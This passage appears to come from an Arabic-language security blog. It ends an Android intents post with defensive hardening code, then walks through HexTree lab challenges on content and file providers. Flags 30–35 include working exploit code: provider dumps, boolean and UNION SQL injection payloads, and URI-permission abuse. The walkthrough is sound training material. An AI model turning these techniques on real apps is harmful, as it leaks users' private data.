android:autoVerify=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;yourdomain.com\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; 2. Robust Data Validation #\rpublic boolean isValidDeepLinkUri(Uri uri) { if (uri == null) return false; // Validate scheme String scheme = uri.getScheme(); if (!\u0026#34;https\u0026#34;.equals(scheme)) return false; // Validate host (avoid common bypasses) String host = uri.getHost(); if (host == null || !host.equals(\u0026#34;yourdomain.com\u0026#34;)) return false; // Validate path String path = uri.getPath(); if (path == null || !path.startsWith(\u0026#34;/allowed/\u0026#34;)) return false; return true; } 3. WebView Security Configuration #\rWebSettings settings = webView.getSettings(); // Disable risky features settings.setGeolocationEnabled(false); settings.setAllowContentAccess(false); settings.setAllowFileAccess(false); // API 29 and lower settings.setAllowFileAccessFromFileURLs(false); settings.setAllowUniversalAccessFromFileURLs(false); // Disable JavaScript if not needed settings.setJavaScriptEnabled(false); // Use WebViewAssetLoader for local assets WebViewAssetLoader assetLoader = new WebViewAssetLoader.Builder() .addPathHandler(\u0026#34;/assets/\u0026#34;, new AssetsPathHandler(this)) .build(); webView.setWebViewClient(new WebViewClient() { @Override public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { return assetLoader.shouldInterceptRequest(request.getUrl()); } }); 4. Input Sanitization #\r// Safe parameter handling public String sanitizeParameter(String input) { if (input == null) return \u0026#34;\u0026#34;; // Remove dangerous characters input = input.replaceAll(\u0026#34;[\u0026lt;\u0026gt;\\\u0026#34;\u0026#39;\u0026amp;]\u0026#34;, \u0026#34;\u0026#34;); // Validate against whitelist if (!input.matches(\u0026#34;[a-zA-Z0-9_-]+\u0026#34;)) { throw new SecurityException(\u0026#34;Invalid parameter format\u0026#34;); } return input; } 5. Content Provider Security #\r// Prevent path traversal public String getSecurePath(String fileName) throws IOException { File baseDir = new File(\u0026#34;/app/safe_directory/\u0026#34;); File requestedFile = new File(baseDir, fileName); // Canonicalize paths to prevent traversal String basePath = baseDir.getCanonicalPath(); String requestedPath = requestedFile.getCanonicalPath(); if (!requestedPath.startsWith(basePath)) { throw new SecurityException(\u0026#34;Path traversal attempt detected\u0026#34;); } return requestedPath; } 6. Safe Browsing Integration #\r\u0026lt;!-- Enable Safe Browsing in manifest --\u0026gt; \u0026lt;application\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.webkit.WebView.EnableSafeBrowsing\u0026#34; android:value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/application\u0026gt; Under The hood ( Android Binder) #\r[!info] Binder part of android system that allows different Android components to talk to each other safely and efficiently.\n[!example] Think of it like a messenger passing notes between students in class. The Binder makes sure the messages are secure and can\u0026rsquo;t be read by anyone else. It also makes sure the messages are delivered quickly and efficiently, so the students can focus on learning.\nIntent-to-Binder Translation Process #\rwe can trace how a high-level Intent is translated to low-level Binder communications:\nApplication Code: The startActivity(intent) function is called in your application code, requesting that an activity be started.\nIntent Processing: Security checks are performed on the intent to ensure it adheres to Android\u0026rsquo;s permission system. One example of such a check is the prepareToLeaveProcess() method.\nService Interaction: If the intent targets a service, the getService().startActivity(intent) method forwards the request to that service.\nParcel Creation: The intent is serialized into a Parcel object, which acts as a container for the data being sent through Binder.\nNative Transition: A native method called writeStrongBinder() is invoked, transitioning from the application layer to the native interface layer where libbinder (the C++ implementation of Binder) resides.\nBinder Driver: The kernel handles inter-process communication (IPC) through the /dev/binder driver, which manages Binder\u0026rsquo;s communication at a low level.\nTarget Process: Upon receiving the IPC request, the target process deserializes the Parcel object back into an intent, allowing the receiving app to process the incoming\nfor more info go to [[Android Binder]]\nResources \u0026amp; Further Reading #\rOfficial Documentation #\rAndroid Intents and Intent Filters PendingIntent Documentation App Links Documentation Deep Linking Guide Implicit Intent Hijacking PendingIntent Security Unsafe Deep Link Usage Security References #\rhttps://blog.oversecured.com/Interception-of-Android-implicit-intents/ Advanced Topics #\rWebView Security Best Practices Content Provider Security Android Binder Deep Dive intent\nDocs implicit hijacking Moving from Android StartActivityForResult to registerForActivityResult Docs intents result StartActivityForResult is deprecated Pending intent\nDOCS PendingIntent https://developer.android.com/guide/components/intents-filters#PendingIntent Pending Intents: A Pentester’s view Hijacking notification Deep links\nDocs deep-linking Deep links from zero to hero medium: Introduction to deep links unsafe-use-of-deeplinks ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/intents/","section":"","summary":"","title":"What is your (Intent)ion","type":"posts"},{"content":"بما إننا هنتعامل مع قاعدة البيانات دي كتير، قولت ما نبصلها الأول عشان نفهم إيه اللي إحنا هنتعمل معاه:\nقاعدة البيانات #\rpublic class FlagDatabaseHelper extends SQLiteOpenHelper { public static final String COLUMN_CONTENT = \u0026#34;content\u0026#34;; public static final String COLUMN_ID = \u0026#34;_id\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; public static final String COLUMN_TITLE = \u0026#34;title\u0026#34;; public static final String COLUMN_VALUE = \u0026#34;value\u0026#34;; public static final String COLUMN_VISIBLE = \u0026#34;visible\u0026#34;; private static final String CREATE_TABKE_NOTE = \u0026#34;CREATE TABLE Note (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, content TEXT NOT NULL );\u0026#34;; private static final String CREATE_TABLE_FLAG = \u0026#34;CREATE TABLE Flag (_id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, value TEXT NOT NULL, visible INTEGER NOT NULL DEFAULT 1);\u0026#34;; private static final String DATABASE_NAME = \u0026#34;flag.db\u0026#34;; private static final int DATABASE_VERSION = 1; public static final String TABLE_FLAG = \u0026#34;Flag\u0026#34;; public static final String TABLE_NOTE = \u0026#34;Note\u0026#34;; public FlagDatabaseHelper(Context context) { super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1); } @Override // android.database.sqlite.SQLiteOpenHelper public void onCreate(SQLiteDatabase sQLiteDatabase) { Log.i(\u0026#34;FlagDatabaseHelper\u0026#34;, \u0026#34;قاعدة البيانات اتعملت\u0026#34;); sQLiteDatabase.execSQL(CREATE_TABLE_FLAG); sQLiteDatabase.execSQL(CREATE_TABKE_NOTE); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag30\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag31\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag32\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 0);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;secret\u0026#39;, \u0026#39;This is a secret note\u0026#39;);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;flag33\u0026#39;, \u0026#39;HXT{censored}\u0026#39;);\u0026#34;); } @Override // android.database.sqlite.SQLiteOpenHelper public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) { sQLiteDatabase.execSQL(\u0026#34;DROP TABLE IF EXISTS Flag\u0026#34;); onCreate(sQLiteDatabase); } من هنا نقدر نشوف أسماء الأعمدة وكام جدول عندنا\nهيكل قاعدة البيانات #\rاسم قاعدة البيانات: flag.db\nالجداول:\nالاول Note و الثاني Flag مخطط جدول Flag #\rالعمود النوع الوصف _id INTEGER (PK) رقم تعريف تلقائي name TEXT اسم الـ flag (مثلاً flag30, flag31) value TEXT قيمة الـ flag (مثلاً HXT{censored}) visible INTEGER إذا كان ظاهر ولا لأ (1 = ظاهر, 0 = مخفي) مخطط جدول Note #\rالعمود النوع الوصف _id INTEGER (PK) رقم تعريف تلقائي title TEXT عنوان الملاحظة content TEXT محتوى الملاحظة البيانات المحملة مسبقاً #\rجدول Flag (الإدخالات الأولية) #\rname value visible flag30 HXT{censored} 1 (ظاهر) flag31 HXT{censored} 1 (ظاهر) flag32 HXT{censored} 0 (مخفي) جدول Note (الإدخالات الأولية) #\rtitle content secret This is a secret note flag33 HXT{censored} دلوقتي يلا نجيب الـ flags بتاعتنا\nFlag 30 #\rتحليل الكود #\r\u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag30Provider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;io.hextree.flag30\u0026#34;/\u0026gt; بما إنه exported ومفيش أي permission بيحميه، نقدر نتصل بيه ونتفاعل معاه زي ما إحنا عايزين\npublic class Flag30Provider extends ContentProvider { // كتير من الـ مش متعملة فحذفتهم methods @Override public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) { if (!uri.getPath().equals(\u0026#34;/success\u0026#34;)) { return null; } Cursor query = this.dbHelper.getReadableDatabase().query( FlagDatabaseHelper.TABLE_FLAG, // اسم الجدول strArr, // الأعمدة اللي عايز ترجعها (projection) \u0026#34;name=? AND visible=1\u0026#34;, // شرط WHERE (فلتر) new String[]{\u0026#34;flag30\u0026#34;}, // قيم الشرط (بتحل محل \u0026#39;?\u0026#39;) null, null, str2 // GroupBy, Having, SortOrder ); query.setNotificationUri(getContext().getContentResolver(), uri); success(logHelper); return query; } } لما نبعت URI عشان نعمل query، بيشيك إذا الـ path هو /success ويرجع entries اللي ليها name flag30 وهي visible=1 يعني الـ SQL query بتبقى شكلها كده:\nSELECT [strArr columns...] FROM flag_table WHERE name = \u0026#39;flag30\u0026#39; AND visible = 1 ORDER BY [str2]; باستخدام الـ authority المعرف في الـ xml، الـ URI هيبقى content://io.hextree.flag30/success\nالحل #\rفي إصدارات Android الحديثة عشان تعامل مع provider لازم تحدد package الـ تطبيق ال فيه provider اللي عايز تعمله query\n\u0026lt;queries\u0026gt; \u0026lt;package android:name=\u0026#34;io.hextree.attacksurface\u0026#34; /\u0026gt; \u0026lt;/queries\u0026gt; ADB:\nadb shell content query --uri content://io.hextree.flag30/success الناتج: Row: 0 _id=1, name=flag30, value=HXT{XXXX-YYYYY-ZZZZ-c}, visible=1\njava:\nUri uri = Uri.parse(\u0026#34;content://io.hextree.flag30/success\u0026#34;); Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); // النتيجة هتتسجل } while (cursor.moveToNext()); } الكود ده بيطلب من app تاني (io.hextree.flag30) بيانات مخفية ويقرأ كل الصفوف والأعمدة من قاعدة البيانات بتاعته ويسجل النتائج.\nFlag 31 #\rتحليل الكود #\r\u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag31Provider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;io.hextree.flag31\u0026#34;/\u0026gt; public class Flag31Provider extends ContentProvider { public static final String AUTHORITY = \u0026#34;io.hextree.flag31\u0026#34;; private static final int FLAGS = 1; private static final int FLAG_ID = 2; static { UriMatcher uriMatcher2 = new UriMatcher(-1); uriMatcher = uriMatcher2; uriMatcher2.addURI(AUTHORITY, \u0026#34;flags\u0026#34;, 1); uriMatcher2.addURI(AUTHORITY, \u0026#34;flag/#\u0026#34;, 2); } @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) { StringBuilder append = new StringBuilder(\u0026#34;Flag31Provider.query(\u0026#39;\u0026#34;).append(uri.getPath()).append(\u0026#34;\u0026#39;): \u0026#34;); UriMatcher uriMatcher2 = uriMatcher; SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase(); int match = uriMatcher2.match(uri); if (match == 1) { throw new IllegalArgumentException(\u0026#34;FLAGS مش متعمل لسه: \u0026#34; + uri); } if (match == 2) { long parseId = ContentUris.parseId(uri); Log.i(\u0026#34;Flag31\u0026#34;, \u0026#34;FLAG_ID: \u0026#34; + parseId); if (parseId == 31) { LogHelper logHelper = new LogHelper(getContext()); logHelper.addTag(uri.getPath()); success(logHelper); } return readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, \u0026#34;name=? AND visible=1\u0026#34;, new String[]{\u0026#34;flag\u0026#34; + parseId}, null, null, str2); } } } الـ provider بيحدد نوعين من أنماط URI:\ncontent://io.hextree.flag31/flags → يطابق FLAGS (كود 1) content://io.hextree.flag31/flag/# → يطابق FLAG_ID (كود 2)، حيث # هو رقم تعريف يعني لو دخلنا id، المطابقة الثانية هتشتغل لو كان 31 فالـ Uri هيبقى شكله كده content://io.hextree.flag31/flag/31\nالحل #\rADB:\nadb shell content query --uri content://io.hextree.flag31/flag/31 الناتج: Row: 0 _id=2, name=flag31, value=HXT{1111-qqqqqq-xxxxx-zzzz}, visible=1\nJava\nUri uri = Uri.parse(\u0026#34;content://io.hextree.flag31/flag/31\u0026#34;); Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } Flag 32 #\rتحليل الكود #\r\u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag32Provider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;io.hextree.flag32\u0026#34; /\u0026gt; نقدر نقسم كلاس الـ provider ده لأجزاء عشان نقدر نقراه أسهل\n1. استعلام Flag فردي (Match == 2) #\rif (match == 2) { // استخراج ID من URI (مثلاً، content://.../flag/32 → ID=32) long parseId = ContentUris.parseId(uri); Log.i(\u0026#34;Flag32\u0026#34;, \u0026#34;FLAG_ID: \u0026#34; + parseId); // استعلام قاعدة البيانات لـ flag محدد return readableDatabase.query( FlagDatabaseHelper.TABLE_FLAG, // اسم الجدول strArr, // الأعمدة المرجعة \u0026#34;name=? AND visible=1\u0026#34;, // flags الظاهرة فقط مع الاسم المطابق new String[]{\u0026#34;flag\u0026#34; + parseId},// البحث عن \u0026#34;flag32\u0026#34; إذا كان ID=32 null, null, str2 // GroupBy, Having, OrderBy ); } بيتعامل مع URIs زي content://provider/flag/32 لما بيستخرج الرقم (32) ويدور على flag32 بيرجع النتائج فقط لما visible=1 (الـ flags المخفية مش هتظهر)\n2. استعلام Flags عام (Match == 1) #\rString str3 = \u0026#34;visible=1\u0026#34; + (str != null ? \u0026#34; AND (\u0026#34; + str + \u0026#34;)\u0026#34; : \u0026#34;\u0026#34;); Cursor query = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str3, strArr2, null, null, str2); if (containsFlag32(query)) { success(logHelper); query.requery(); } return query; ده افتراضياً بيظهر كل الـ flags حيث visible=1 ونقدر نضيف فلاتر إضافية من خلال معامل str وكمان عنده معالجة خاصة لـ flag32 اللي بتشغل success\n3. فاحص Flag32 #\rpublic boolean containsFlag32(Cursor cursor) { if (cursor == null) { return false; } int columnIndex = cursor.getColumnIndex(FlagDatabaseHelper.COLUMN_NAME); while (cursor.moveToNext()) { if (\u0026#34;flag32\u0026#34;.equals(cursor.getString(columnIndex))) { return true; } } return false; } بيسكان نتائج الاستعلام لأي صف اسمه \u0026ldquo;flag32\u0026rdquo; ويرجع true فقط إذا flag32 موجود وظاهر\nباختصار:\nده كمان بيحدد نفس matchers من الـ flags اللي فاتت. method الـ query() نقدر نمشي فيه بطريقتين:\nلاستعلامات Flag فردية (FLAG_ID, match == 2)\nباستخراج الـ ID من الـ URI (مثلاً، /flag/32 → ID 32) والاستعلام عنه مع visible=1 ويرجع إذا لقى مطابقة لاستعلام Flags عام (FLAGS, match == 1)\nإنشاء query مع visible=1 ثم إضافة أي معايير اختيار إضافية إذا توفرت وبعد تنفيذ الاستعلام، بيشيك إذا النتائج فيه \u0026ldquo;flag32\u0026rdquo; باستخدام containsFlag32() إذا لقاه بيشغل success بتاعنا الحل #\rالمفتاح في الجزء الثاني لأنه بيبني الفلاتر للاستعلام (sql query) وياخد input مباشرة وده بيخليه عرضة لـ sql injection (Boolean based sql injection)\nString str3 = \u0026#34;visible=1\u0026#34; + (str != null ? \u0026#34; AND (\u0026#34; + str + \u0026#34;)\u0026#34; : \u0026#34;\u0026#34;); Cursor query = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str3, strArr2, null, null, str2); if (containsFlag32(query)) { success(logHelper); query.requery(); } return query; يعني\nvisible=1 AND ( أي حاجة) --الأصلي visible=1 AND (1=1) OR (1=1) --شكل الـ payload بتاعنا Uri uri = Uri.parse(\u0026#34;content://io.hextree.flag32/flags\u0026#34;); Cursor cursor = getContentResolver().query(uri, null, \u0026#34;1=1) OR (1=1\u0026#34;, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } Flag 33_1 #\rتحليل الكود #\r\u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag33Provider1\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;io.hextree.flag33_1\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;/\u0026gt; هنا مقدرش أعمله query مباشرة بس عندي URI permission اللي بتدي permission مؤقت لـ URIs محددة، حتى لو اللي بيطلب مش عنده صلاحية عادة.\nvoid prepareDB(LogHelper logHelper) { ContentValues contentValues = new ContentValues(); contentValues.put(FlagDatabaseHelper.COLUMN_CONTENT, logHelper.appendLog(Flag33Activity1.FLAG)); this.dbHelper.getReadableDatabase().update(FlagDatabaseHelper.TABLE_NOTE, contentValues, \u0026#34;title=?\u0026#34;, new String[]{\u0026#34;flag33\u0026#34;}); } public boolean containsFlag33(Cursor cursor) { if (cursor == null) { return false; } boolean z = false; while (cursor.moveToNext()) { int i = 0; while (true) { if (i \u0026gt;= cursor.getColumnCount()) { break; } if (\u0026#34;flag33\u0026#34;.equals(cursor.getString(i))) { z = true; break; } i++; } } return z; } الـ prepareDB() بياخد الـ flag الحقيقي (من Flag33Activity1) ويحدث entry الـ flag33 في جدول Note بيه بس يخلي جدول Note رسمياً \u0026ldquo;مقفول\u0026rdquo; للاستعلامات؟! والـ containsFlag33 بيبص في كل البيانات المرجعة لو لقى \u0026ldquo;flag33\u0026rdquo; في أي حتة، بيرجع true\npublic static final String AUTHORITY = \u0026#34;io.hextree.flag33_1\u0026#34;; private static final int FLAGS = 1; private static final int NOTES = 2; static { UriMatcher uriMatcher2 = new UriMatcher(-1); uriMatcher = uriMatcher2; uriMatcher2.addURI(AUTHORITY, \u0026#34;flags\u0026#34;, 1); uriMatcher2.addURI(AUTHORITY, \u0026#34;notes\u0026#34;, 2); } @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) { StringBuilder append = new StringBuilder(\u0026#34;Flag33Provider1.query(\u0026#39;\u0026#34;).append(uri.getPath()).append(\u0026#34;\u0026#39;): \u0026#34;); UriMatcher uriMatcher2 = uriMatcher; Log.i(\u0026#34;Flag33Provider1\u0026#34;, append.append(uriMatcher2.match(uri)).toString()); SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase(); int match = uriMatcher2.match(uri); if (match != 1) { if (match == 2) { throw new IllegalArgumentException(\u0026#34;الوصول لجدول Notes مش متعمل لسه\u0026#34;); } throw new IllegalArgumentException(\u0026#34;URI مش معروف: \u0026#34; + uri); } prepareDB(logHelper); Cursor query = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str, strArr2, null, null, str2); if (containsFlag33(query)) { success(logHelper); } دلوقتي عندنا 2 طرق نقدر نمشي فيهم:\nلو طلبت \u0026ldquo;flags\u0026rdquo; (path /flags)، هتروح لجدول flags وتشوف محتواه لو طلبت \u0026ldquo;notes\u0026rdquo; (path /notes)، هتروح لقسم 2 (بس ده مقفول ومش متاح رسمياً) وبعدين باقي الكود بيشيك إيه اللي بتطلبه (flags فقط) يعني (match !=1) ثم يشغل prepareDB() (اللي زي ما شرحنا فوق) يحضر جدول notes ويشغل الـ query بتاعك على جدول Flag لو لقى \u0026ldquo;flag33\u0026rdquo; في النتائج، بيشغل success\nدلوقتي إزاي نتكلم معاه؟ باستخدام activity 31_1\nIntent intent = getIntent(); String stringExtra = intent.getStringExtra(\u0026#34;secret\u0026#34;); if (stringExtra == null) { if (intent.getAction() == null || !intent.getAction().equals(\u0026#34;io.hextree.FLAG33\u0026#34;)) { return; } intent.setData(Uri.parse(\u0026#34;content://io.hextree.flag33_1/flags\u0026#34;)); intent.addFlags(1); setResult(-1, intent); finish(); return; } if (Flag33Provider1.secret.equals(stringExtra)) { this.f = new LogHelper(this); this.f.addTag(\u0026#34;access-notes-table\u0026#34;); this.f.addTag(\u0026#34;flag33\u0026#34;); checkStatus(this); } } بيستلم intent ولو ليه action \u0026quot;io.hextree.FLAG33\u0026quot; والـ extra string بـ null بيضبط الـ Uri بـ \u0026quot;content://io.hextree.flag33_1/flags\u0026quot; وflag 1 اللي هو FLAG_GRANT_READ_URI_PERMISSION\nالحل #\rيعني إيه اللي نقدر نعمله؟ نقدر نبعت intent بـ startActivityForResult ونستخدم SQLi injection بس المرة دي اسمها union attack لأننا عايزين نوصل لجداول تانية من قاعدة البيانات، ونستخدم الـ cursor بتاعنا عشان نجيب البيانات ونسجلها\nIntent intent = new Intent(\u0026#34;io.hextree.FLAG33\u0026#34;); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag33Activity1\u0026#34;)); startActivityForResult(intent,0); @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == 0) { Log.d(\u0026#34;flags\u0026#34;, data.getData().toString()); // where _id=2 union Select Cursor cursor = getContentResolver().query(data.getData(), new String[]{\u0026#34;name\u0026#34;, \u0026#34;value\u0026#34;,\u0026#34;visible\u0026#34;}, \u0026#34;_id = 2 UNION SELECT * FROM Note\u0026#34;, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } } } Flag 33_2 #\rتحليل الكود #\r\u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag33Provider2\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;io.hextree.flag33_2\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;/\u0026gt; زي الـ flag اللي فات مقدرش أوصله بس component تاني مع الطلبات الصح يقدر يوصله وبصة على activity33_2 عنده المتطلبات الصح\nString stringExtra = getIntent().getStringExtra(\u0026#34;secret\u0026#34;); if (stringExtra == null) { Intent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.FLAG33\u0026#34;); intent.setData(Uri.parse(\u0026#34;content://io.hextree.flag33_2/flags\u0026#34;)); intent.addFlags(1); startActivity(intent); return; } ده بيعمل implicit intent مع action \u0026quot;io.hextree.FLAG33\u0026quot; وdata للـ provider الثاني\nالحل #\rنفس الـ payload بتاع flag33_1 بس هنعمل filter للـ action\n\u0026lt;activity android:name=\u0026#34;.Providers\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.FLAG33\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;content\u0026#34; android:host=\u0026#34;io.hextree.flag33_2\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent intent_33 = getIntent(); if (intent_33.getAction() != null \u0026amp; \u0026#34;io.hextree.FLAG33\u0026#34;.equals(getIntent().getAction())) { Cursor cursor = getContentResolver().query(intent_33.getData(), new String[]{\u0026#34;name\u0026#34;, \u0026#34;value\u0026#34;, \u0026#34;visible\u0026#34;}, \u0026#34;_id = 2 UNION SELECT * FROM Note\u0026#34;, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } } Flag 34 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag34Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; الـ activity مصدّر يعني نقدر نتفاعل معاه من الـ app بتاعنا\npublic void onCreate(Bundle bundle) { super.onCreate(bundle); String stringExtra = getIntent().getStringExtra(\u0026#34;filename\u0026#34;); if (stringExtra != null) { prepareFlag(this, stringExtra); Uri uriForFile = FileProvider.getUriForFile(this, \u0026#34;io.hextree.files\u0026#34;, new File(getFilesDir(), stringExtra)); Intent intent = new Intent(); intent.setData(uriForFile); intent.addFlags(3); setResult(0, intent); return; } Uri uriForFile2 = FileProvider.getUriForFile(this, \u0026#34;io.hextree.files\u0026#34;, new File(getFilesDir(), \u0026#34;secret.txt\u0026#34;)); Intent intent2 = new Intent(); intent2.setData(uriForFile2); intent2.addFlags(3); setResult(-1, intent2); } void prepareFlag(Context context, String str) { if (str.contains(\u0026#34;flag34.txt\u0026#34;) \u0026amp;\u0026amp; new File(getFilesDir(), str).exists()) { LogHelper logHelper = new LogHelper(context); logHelper.addTag(\u0026#34;file-provider\u0026#34;); logHelper.addTag(\u0026#34;flag34\u0026#34;); Utils.writeFile(this, \u0026#34;flags/flag34.txt\u0026#34;, logHelper.appendLog(FLAG)); } } لما يستلم intent بيشيك على string data تحت اسم filename ولو null، uri محدد مسبقاً لملف بيتستخدم content://io.hextree.files/secret.txt ولو فيه data، الـ uri هيتعمل مع الـ authority والاسم اللي دخلناه. بس إحنا عايزين إيه؟ الـ method اللي بتحضر الـ flag بتقترح إنها بتاخد الـ flag من مكان وتكتبه في flags/flag34.txt\nالحل #\rلازم نوصل لـ flags/flag34.txt وعشان كده هنضيفه تحت filename وبما إن فيه result بيتحط فهنستخدم startActivityForResult()\nIntent intent = new Intent(); intent.putExtra(\u0026#34;filename\u0026#34;,\u0026#34;flags/flag34.txt\u0026#34;); // لو عايز secret ماتستخدمهوش intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag34Activity\u0026#34;)); startActivityForResult(intent,1); if (requestCode == 1) { Log.d(\u0026#34;Hextree\u0026#34;,\u0026#34;URI: \u0026#34;+ data.getData().toString()); try { InputStream inputStream = getContentResolver().openInputStream(data.getData()); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line ; while ((line = reader.readLine()) != null) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); } } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } Flag 35 #\rتحليل الكود #\r\u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag35FileProvider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;io.hextree.root\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.support.FILE_PROVIDER_PATHS\u0026#34; android:resource=\u0026#34;@xml/rootpaths\u0026#34;/\u0026gt; \u0026lt;/provider\u0026gt; الـ provider مش متاح نكلمه مباشر بس عنده uri permissions والـ authority بتاعه io.hextree.root وفيه paths محددة في مكان ما\n\u0026lt;paths\u0026gt; \u0026lt;root-path name=\u0026#34;root_files\u0026#34; path=\u0026#34;/\u0026#34;/\u0026gt; \u0026lt;/paths\u0026gt; يعني الـ root directory (الملف الريئيسي اليبتدي التحرك منه) للـ provider ده هو الـ root directory / وله اسم root_files\n\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag34Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; public void onCreate(Bundle bundle) { super.onCreate(bundle); String stringExtra = getIntent().getStringExtra(\u0026#34;filename\u0026#34;); if 